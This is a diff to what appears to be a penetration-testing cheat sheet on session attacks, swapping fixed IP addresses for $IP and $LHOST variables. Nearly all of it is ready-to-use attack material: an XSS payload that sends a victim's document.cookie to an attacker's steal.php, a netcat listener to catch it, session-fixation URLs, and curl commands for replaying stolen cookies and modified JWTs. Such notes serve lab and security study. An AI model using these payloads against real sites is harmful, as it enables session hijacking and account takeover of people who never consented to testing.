@@ -18,7 +18,7 @@
 ### Using cURL to Capture Cookies
 
 ```bash
-curl -c cookies.txt -b cookies.txt -v http://10.10.10.10/profile
+curl -c cookies.txt -b cookies.txt -v http://$IP/profile
 ```
 
 - `-c cookies.txt` → Saves cookies to a file.
@@ -38,7 +38,7 @@ curl -c cookies.txt -b cookies.txt -v http://10.10.10.10/profile
 ### XSS Cookie Theft
 
 ```html
-<script>document.location='http://<attacker-ip>/steal.php?cookie='+document.cookie</script>
+<script>document.location='http://$LHOST/steal.php?cookie='+document.cookie</script>
 ```
 
 Listen for the stolen cookie:
@@ -52,13 +52,13 @@ nc -lvnp 80
 Force the victim to use a known session ID:
 
 ```
-http://10.10.10.10/login?sessionid=ATTACKERSESSION
+http://$IP/login?sessionid=ATTACKERSESSION
 ```
 
 Once the victim logs in, reuse the session:
 
 ```bash
-curl -b "sessionid=ATTACKERSESSION" http://10.10.10.10/dashboard
+curl -b "sessionid=ATTACKERSESSION" http://$IP/dashboard
 ```
 
 ### JWT Token Theft
@@ -73,5 +73,5 @@ echo "<JWT Token>" | jwt_tool -d
 3. Modify the token and replay it:
 
 ```bash
-curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
+curl -H "Authorization: Bearer <MODIFIED_JWT>" http://$IP/api
 ```
